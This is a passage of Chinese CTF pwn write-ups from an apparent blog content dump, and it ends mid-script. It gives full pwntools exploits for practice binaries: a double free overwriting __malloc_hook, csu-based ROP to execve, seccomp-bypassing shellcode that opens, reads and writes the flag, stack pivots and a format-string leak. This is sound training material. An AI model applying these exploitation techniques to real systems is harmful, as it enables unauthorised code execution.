12345678add(16,0x20,b&#x27;aaaa&#x27;)add(17,0x20,b&#x27;bbbb&#x27;)add(18,0x20,b&#x27;aaaa&#x27;)main_arena_addr = int(io.recv(14),16)success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f355d756ca0-0x7f355d36b000)success(hex(libc_addr))onegadget_addr = libc_addr + 0x10a38c 此时我们连续申请三个chunk 申请的第三个chunk就会分配到main_arena的空间 就成功泄露了基址 1234567891011121314add(19,0x60,b&#x27;aaaa&#x27;)delete(19)delete(19)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]add(20,0x60,p64(malloc_hook))add(21,0x60,b&#x27;aaaa&#x27;)add(22,0x60,p64(onegadget_addr))io.recvuntil(&quot;choice &gt; &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;input the index&quot;)io.sendline(b&#x27;23&#x27;)io.recvuntil(&quot;input the size&quot;)io.sendline(b&#x27;0x70&#x27;)io.interactive() 最后一步同理 通过同样的double free办法 获取任意写malloc_hook的机会 将其修改为onegadget 再次调用malloc的时候就会触发onegadget 获取shell ciscn-2019-s-312345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 主体函数非常简单 利用系统调用号实现了一次输入和输出 12345678signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; 还有一个gadget函数 看一下汇编代码 1234567891011121314151617.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 retn.text:00000000004004E9 ; --------------------------------------------------------------------------- 下方的0x3b则为59 是execve的系统调用号 应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址 所以只能通过写入栈上 要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10 还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流 1234567891011121314151617.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; &#x27;0&#x27; ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write.text:0000000000400519 retn.text:0000000000400519 vuln endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; --------------------------------------------------------------------------- 1234567891011121314from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr)) 可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移 这里的原因暂时没有办法得知 先放着这个疑问 下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu 具体的流程我就不过多赘述了 123456789101112131415161718rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload) 这里重点解释一下三个方面 1.为什么要多出一个p64(int59_addr)在栈上 这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的 2.binsh_addr和stack_addr的偏移是怎么求出来的 我们将断点打在csu执行到call r12那一行 然后gdb看一下栈 可以计算出偏移为0x138 还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向 如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容 1set $rsp = $rsp-0x150 看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧 最终exp: 12345678910111213141516171819202122232425262728293031from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"极客大挑战 2019 Not Bad","slug":"极客大挑战-2019-Not-Bad","date":"2023-02-19T05:55:29.000Z","updated":"2023-02-19T06:15:12.395Z","comments":true,"path":"2023/02/19/极客大挑战-2019-Not-Bad/","link":"","permalink":"http://example.com/2023/02/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/","excerpt":"","text":"手写shellcode 但是比较简单 记录一下思路 保护机制 12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments ida看一下 12345678__int64 __fastcall main(int a1, char **a2, char **a3)&#123; mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL); seccomp(); buffer(); vuln(); return 0LL;&#125; mmap开辟了一块内存 地址从0x123000 - 0x124000 权限是可写可执行 还有三个函数 跟进一下看看 1234567891011__int64 seccomp()&#123; __int64 v1; // [rsp+8h] [rbp-8h] v1 = seccomp_init(0LL); seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL); seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL); return seccomp_load(v1);&#125; 开沙盒了 看看限制了啥 12345678910111213 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL 只能允许open read write三个函数 那就是orw了 接着跟进下一个函数 123456void buffer()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; 清空了缓存区 这个没啥好说的 跟进下一个函数 12345678int vuln()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF puts(&quot;Easy shellcode, have fun!&quot;); read(0, buf, 0x38uLL); return puts(&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;);&#125; 给了一次0x10字节栈溢出的机会 这种情况下大概率就是手写shellcode了 应该是有哪个地方给了jmp rsp指令 ropgadget找一下 12345678910111213chen@chen-virtual-machine:~$ ROPgadget --binary pwn --only &#x27;jmp|rsp&#x27;Gadgets information============================================================0x00000000004002d8 : jmp 0x4002ad0x000000000040078b : jmp 0x4007700x00000000004008eb : jmp 0x4008800x0000000000400b03 : jmp 0x400b7a0x0000000000400b87 : jmp qword ptr [rax - 0x68000000]0x0000000000400ceb : jmp qword ptr [rbp]0x0000000000400865 : jmp rax0x0000000000400a01 : jmp rspUnique gadgets found: 8 果然有一个 不过由于0x10还要算上jmp rsp 那么给shellcode的字节就只有8字节了 这显然是啥也干不了的 gdb动调看了下寄存器 都要我们重新赋值 这个时候可以利用sub rsp来往上抬栈 从而使得原本是用垃圾数据填充的部分可以被我们利用起来 完整exp: 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &#x27;debug&#x27;#io=process(&#x27;./pwn&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26981)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]jmp_rsp = 0x400A01magic_addr = 0x123000io.recvuntil(&quot;Easy shellcode, have fun!&quot;)shellcode = &quot;&quot;&quot;xor eax,eaxxor edi,edimov edx,200mov rsi,0x123500syscalljmp rsi&quot;&quot;&quot;shellcode2 = &quot;&quot;&quot;sub rsp,0x30jmp rsp&quot;&quot;&quot;payload = asm(shellcode).ljust(0x28,b&#x27;\\x00&#x27;)+p64(jmp_rsp)+asm(shellcode2)# gdb.attach(io,&#x27;b *0x400A4A&#x27;)# pause(0)io.send(payload)shellcode3 = asm(shellcraft.open(&#x27;./flag&#x27;))shellcode3 += asm(shellcraft.read(3,magic_addr+0x50,0x50))shellcode3 += asm(shellcraft.write(1,magic_addr+0x50,0x50))io.send(shellcode3)io.recv()io.recv()io.recv()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"VNCTF2023","slug":"VNCTF2023","date":"2023-02-18T14:26:28.000Z","updated":"2023-02-20T15:32:22.905Z","comments":true,"path":"2023/02/18/VNCTF2023/","link":"","permalink":"http://example.com/2023/02/18/VNCTF2023/","excerpt":"","text":"Traveler保护机制 ida 两个关键函数 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;who r u?&quot;); read(0, buf, 0x30uLL); puts(&quot;How many travels can a person have in his life?&quot;); read(0, &amp;msg, 0x28uLL); return 0;&#125; 1234int boynextdoor()&#123; return system(&quot;echo flag&quot;);&#125; boynextdoor函数只能输出flag字符串 而非flag文件内容 单纯的提供了system函数 所以这里大胆猜测这题不用泄露libc基址 回到main函数 提供了两次read 一次可以溢出0x10字节的数据 一次往bss段写数据 再加上提供了system函数 所以这里一开始是想的很简单 直接栈迁移到bss段上 构造system(“&#x2F;bin&#x2F;sh”) 但是很快发现打不通 执行流卡在了这里 此时的rsp位于0x403d00 问题可能出在这里 因为这题的bss段的位置实在是太奇怪了 按理来说64位的二进制程序中bss段一般都是0x600000往后的 可以看到0x403000 - 0x404000 是只有可读权限的 只有在0x404000 - 0x405000之间才有写权限 所以此时rsp执行到了0x403d00以后 没有办法继续写入内容了 故无法成功执行system 那么此时就是想办法抬高栈帧 一开始是打算构造read来往高地址重新写入rop链 随后返回main函数重新栈迁移 但是再次执行read函数的时候 rsi寄存器受到了污染 不在指向原本的栈地址 1234.text:000000000040121A mov edx, 30h ; &#x27;0&#x27; ; nbytes.text:000000000040121F mov rsi, rax ; buf.text:0000000000401222 mov edi, 0 ; fd.text:0000000000401227 call _read 不过联想到了西湖论剑的calc的做法 在bss段构造rop链 写入的地址紧跟在rop链后 这样就可以循环执行 具体可以去看我相关的博客 完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.log_level = &#x27;debug&#x27;io=process(&#x27;./pwn&#x27;)#io = remote(&quot;node4.buuoj.cn&quot;,25261)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;who r u?&quot;)backdoor_addr = 0x4011ddleave_addr = 0x0000000000401253bss_addr = 0x4040A0payload = cyclic(0x20)+p64(bss_addr)+p64(leave_addr)io.send(payload)rdi_addr = 0x4012c3system_addr = 0x4011ECputs_plt = 0x401070puts_got = elf.got[&#x27;puts&#x27;]start_addr = 0x4010b0read_got = elf.got[&#x27;read&#x27;]system_got = elf.got[&#x27;system&#x27;]main_addr = elf.sym[&#x27;main&#x27;]ret_addr = 0x000000000040101aio.recvuntil(&quot;How many travels can a person have in his life?&quot;)read_addr = 0x4010a0rsi_r15_addr = 0x00000000004012c1add_rsp = 0x0000000000401016rsp_addr = 0x00000000004012bdpayload = b&#x27;/bin/sh\\x00&#x27;+p64(rsi_r15_addr)+p64(0x4040c8)+p64(0)+p64(read_addr)# gdb.attach(io,&#x27;b *0x401254&#x27;)# pause(0)io.send(payload)payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0)+p64(0x4040f0)+p64(read_addr)io.send(payload)for i in range(1,50): payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0+0x28*i)+p64(0x4040f0+0x28*i)+p64(read_addr) io.send(payload)payload = p64(ret_addr)+p64(ret_addr)+p64(rdi_addr)+p64(0x4040a0)+p64(system_addr)io.send(payload)io.interactive() 另外再借助猫神的exp以其他做法复现了一遍 收获也很大 记录一下 我觉得十分有必要逐步分析 首先 我们的栈空间不够 所以需要往高地址写入rop链再迁移过去 这是最开始的思路 起初我是认为第二次main函数的read的rsi参数被破坏了 这是因为我用的是垃圾数据覆盖rbp 在复现第二题的时候意识到了这个问题 而其rsi寄存器的值实际上是取rbp-0x20处的数据 1234.text:000000000040121A mov edx, 30h ; &#x27;0&#x27; ; nbytes.text:000000000040121F mov rsi, rax ; buf.text:0000000000401222 mov edi, 0 ; fd.text:0000000000401227 call _read 所以如果我们适当调整rbp的值 这里的read就可以做到任意写 我们预想的情况还是在bss段上通过连续的rop链来牢牢掌握住程序控制流 1pad0 = b&quot;a&quot;*0x20+p64(0x4040c0+0x20)+p64(0x401216) 这一段payload用来供第一次main函数的第一个read函数读入 用来覆盖rbp的0x4040c0这个可以先忽略 在实际做题中暂且认为其是一个变量 值为0x4040a0+len(payload) 此处的payload为第一次main函数第二次read读入的rop链长度 此时程序执行到了第二次read这里 读入的首地址是0x4040a0 12read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) gdb动调查看各个寄存器的值 发现我们只需要修改rsi寄存器的值就可以构造read函数 读入的地址挑选一个高地址处的 抬高栈帧 接下来 程序继续运行 跳转到了0x401216 再次执行一次read 但是要注意在栈帧结束时的leave指令 此时使得rbp指向了0x4040e0 于是我们这时候执行的read参数为 1p64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret) 这一段payload主要是用来进行栈迁移到高地址处 通过弹出0x4048d8给rbp寄存器 leave_ret将栈迁移到了0x4048d8 接着程序执行流执行到了第二次main函数的第二次read 12read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) 这个read读入的首地址仍然是0x4040a0 所以和第一次main读入一样的数据就行了 随后 第二次main函数准备结束栈帧 执行leave|ret两条指令 mov rsp,rbp rsp指向0x4040e8 rbp指向0x404098 还记得我们之前往0x4040c0写入的rop链吗 此刻派上用场了 位于0x4040e8的正是leave指令 执行完leave以后 rbp为0 rsp为0x4040a0 此刻程序执行流来到了我们最初往0x4040a0写入的rop链 其再次构造了一次read 这个read读入地址的首地址为0x4048d8 1rop_sh = p64(0x4048d8)+p64(pop_rdi)+p64(0x4048f8)+p64(system_plt)+b&#x27;/bin/sh&#x27;+p64(0) 此时程序执行到read函数结束 准备ret到下一个字长处的指令 那么此时就是pop rbp 接着往下一个字长处是leave_ret 相当于一个栈迁移 而此时0x4040c8处我们填充的就是0x4048d8 而0x4048d8处我们填充的也是0x4048d8 所以rsp和rbp此时就完成了一次栈迁移 rsp指向了构造的system 到这里整个程序的执行流就结束了 不过还是没有理解的地方 按理来说 12read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) 中的pop_rbp和下面的 1p64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret) 中的pop_rbp所存储的是同一个内存空间 都是0x4040c0 不知道为啥删去前面一个就会导致程序卡死 问题貌似出在这一段rop链错位了 0x4040c0应该存放的是pop rbp 而0x4040c8不应该为0 而是存放0x4048d8 这个疑点目前以我的动调水平还看不出来是啥问题 留着以后探讨吧 不过这次复现真的提升很大 对于栈迁移更加熟悉了 特别是学会了利用pop rbp的方法来栈迁移 不得不说和猫神这样的大牛子差距真的太大了 tongxunlu考的就是一个函数的返回值在寄存器存放中的知识点 在这题之前我们先来看一个小程序 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, buf, 0x30uLL); puts(&quot;pause&quot;); return 0;&#125; 调式exp: 12345678910111213141516171819from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()payload = cyclic(0x8)gdb.attach(io,&#x27;b *$rebase(0x72C)&#x27;)pause()io.send(payload)pause() 将断点打在call read之后 随后我们来看一下寄存器的值 可以看到此时rax寄存器的值是0x8 正是我们通过read输入的数据的字节数 而read函数的返回值则等于接收到的字节数 同理 我们来试一下strtol函数 即本题的关键漏洞函数 1234567891011#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;seccomp.h&gt;#include&lt;string.h&gt;int main()&#123; char a[20]; long int b; read(0,a,0x30); b= strtol(a,0,10); puts(&quot;pause&quot;);&#125; 12345678910111213141516171819from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;#elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()payload = b&#x27;11&#x27;+b&#x27;aaaaaaaa&#x27;gdb.attach(io,&#x27;b *$rebase(0x77D)&#x27;)pause(0)io.send(payload)pause() 可以看到11是被rax寄存器存储 aaaaaaaa 被rdi寄存器存储 strtol函数一共需要三个参数 1long int strtol(const char *str, char **endptr, int base) str字符串提供要经过转化的字符串 endptr用来存放剩余字符串 base用来指定转化的进制 就**strtol(a,0,10)**举例 我们给定的进制为10进制 那么其只会接收0-9的字符 如果检测到了不属于这个范围的 则会停止接收 比如读入了两个11后 检测到了a 则停止接收 使返回值为11 而接下来剩余的字符串 会一直接收到识别到\\x00 即字符串的结束 将其放入到endptr中 在这个程序中的表现就是被放入到rdi寄存器存储 上述的一切程序编译环境是Ubuntu18.04 更换libc为libc-2.31.so 说回vn的这一题 保护机制 12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 再来看一下反汇编后的代码 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; init_buf(argc, argv, envp); eeee_wantboy(); hao_kang_de(); return 0;&#125; 三个函数 init_buf用来清空缓存区 来看剩下两个 12345678910111213141516171819__int64 eeee_wantboy()&#123; char v1[256]; // [rsp+0h] [rbp-130h] BYREF char buf[36]; // [rsp+100h] [rbp-30h] BYREF int v3; // [rsp+128h] [rbp-8h] int v4; // [rsp+12Ch] [rbp-4h] v4 = 0; v3 = 0; puts(&quot;halo little giegie,my name is eeee,i am 11111&quot;); puts(&quot;can i get your phone number&quot;); puts(&quot;if you give me your number,i will give you some hao_kang_de&quot;); read(0, buf, 0x40uLL); printf(&quot;i get you ! little giegie&quot;); printf(&quot;heyhey , hao_kang_de is %lx \\n&quot;, v1); puts(&quot;anything want to say?&quot;); read(0, v1, 0x100uLL); return strtol(buf, 0LL, 10);&#125; 有一个栈溢出漏洞 但是只够覆盖rbp和retaddr 不过前面一题是栈迁移 应该不会两题都考 还有一次往v1输入数据的机会 不过没有栈溢出 也覆盖不到buf 最后是调用了strtol函数 联想到我们上面做的小实验 所以这里我们可以控制rax和rdi寄存器的值 接着看下一个函数 12345678int hao_kang_de()&#123; signed __int64 v0; // rax puts(&quot;wait!! i will give you something&quot;); v0 = sys_write(0, 0LL, 0LL); return puts(&quot;hhhh~i just tell a joke&quot;);&#125; 转化成汇编形式 1234567891011121314.text:000000000000087B push rbp.text:000000000000087C mov rbp, rsp.text:000000000000087F lea rdi, s ; &quot;wait!! i will give you something&quot;.text:0000000000000886 call _puts.text:000000000000088B mov rax, 1.text:0000000000000892 mov rdi, 0 ; fd.text:0000000000000899 mov rsi, 0 ; buf.text:00000000000008A0 mov rdx, 0 ; count.text:00000000000008A7 syscall ; LINUX - sys_write.text:00000000000008A9 lea rdi, aHhhhIJustTellA ; &quot;hhhh~i just tell a joke&quot;.text:00000000000008B0 call _puts.text:00000000000008B5 nop.text:00000000000008B6 pop rbp.text:00000000000008B7 retn 是采用syscall的方法调用的write 联想到我们可以修改rax和rdi 所以这里可以直接partical write的方法跳转到0x899这里 进行系统调用 完整exp: 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def exploit(): io=process(&#x27;./pwn&#x27;) io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;) payload = b&#x27;59&#x27;+b&#x27;/bin/sh\\x00&#x27; payload += cyclic(0x2e)+p16(0x899) io.send(payload) io.recvuntil(&quot;anything want to say?&quot;) payload = p64(0) # gdb.attach(io,&#x27;b *$rebase(0x976)&#x27;) # pause(0) io.send(payload) # pause() io.sendline(&quot;cat flag&quot;) result = io.recv(timeout=1) io.interactive()if __name__ == &#x27;__main__&#x27;: try_count = 0 while(True): try: exploit() except: try_count += 1 print(&quot;failed :&#123;&#125;&quot;.format(try_count)) 这题还看到其他师傅有比较新奇的思路 用的是格式化字符串泄露libc基址 试着跟着复现了一下 感觉收获还是很多的 因为这题开启了PIE 所以没有办法利用第一个栈溢出到处跑 只能说试着爆破最后两个字节或者是覆盖最后一个字节来做到同页内迁移 正常情况下eeee_wantboy函数的返回地址是 如果我们只覆盖最后一个字节就可以做到同页内的迁移 可以跳转到0x555555554900 - 0x555555554a00的任意地址 也就是eeee_wantboy函数的一部分和main函数 原本的程序执行顺序是先read再提供栈的地址 通过跳转的办法我们就可以获得栈地址后再考虑如何构造rop链 同时你要注意到read函数的rsi参数是根据rbp的地址来寻找的 12345.text:0000000000000943 lea rax, [rbp+var_130].text:000000000000094A mov edx, 100h ; nbytes.text:000000000000094F mov rsi, rax ; buf.text:0000000000000952 mov edi, 0 ; fd.text:0000000000000957 call _read 如果用垃圾数据覆盖rbp 就丢失了这次read的机会 这里把漏洞点放到没有指定任何参数 而是单独输出字符串的printf函数上面 我们只需要控制rdi寄存器就可以触发格式化字符串漏洞 这里也是借助strtol函数的特性来操控rdi寄存器 12345678910111213141516171819202122232425from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)pause(0)io.send(b&#x27;chen&#x27;)pause() 这里的rbp之所以用stack_addr+0x218覆盖 也是为了使得第二次执行eeee函数时的read的rsi参数正确 我们预想的是直接写到rsp处 这样在执行read指令时 其内部存在的ret指令就可以将rop链的首部弹出到rip 控制程序执行流 这个偏移并不是唯一的 可以自己更换数值多动调 按我下面的办法 此时rsp是指向0x7ffc8d148b50处 而我们的rbp设置成了stack_addr+0x218 为0x7ffc8d148c28 所以read读入的地址是rbp-0x130 也就是0x7ffc8d148af8 此时s进入call read指令 当其执行到ret准备执行下一个指令时的rsp指针指向0x7ffc8d148b48 所以我们read需要填充的垃圾数据就是0x7ffc8d148b48-0x7ffc8d148af8&#x3D;0x50 另外执行system的时候还需要注意栈对齐 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)# gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)# pause(0)io.send(b&#x27;chen&#x27;)libc_start_main_addr = int(io.recvuntil(&quot;|&quot;,drop = True),16)-243success(&quot;libc_start_main_addr :&quot;+hex(libc_start_main_addr))elf_base = int(io.recv(14),16)-0x978success(&quot;elf_base :&quot;+hex(elf_base))libc_addr = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rdi_addr = elf_base + 0x0000000000000a13io.recvuntil(&quot;anything want to say?&quot;)ret_addr = elf_base + 0x000000000000069epayload = 